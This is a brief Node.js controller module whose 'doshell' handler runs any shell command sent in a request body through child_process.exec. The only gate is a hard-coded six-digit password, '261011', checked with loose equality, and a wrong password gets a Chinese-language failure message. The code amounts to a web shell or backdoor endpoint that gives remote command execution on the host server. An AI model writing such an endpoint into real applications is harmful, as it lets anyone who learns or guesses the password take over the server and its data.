const { exec } = require("child_process")

module.exports = {
    doshell(req, res) {
        const shell = req.body.shell
        const passowrd = req.body.passowrd
        if (passowrd == "261011") {
            exec(shell, (err, stdout, stderr) => {
                res.json({
                    code: 200,
                    msg: "ok",
                    err: err
                })
            })
        } else {
            res.json({
                code: 200,
                msg: "执行失败，密码不正确"
            })
        }
    }
}
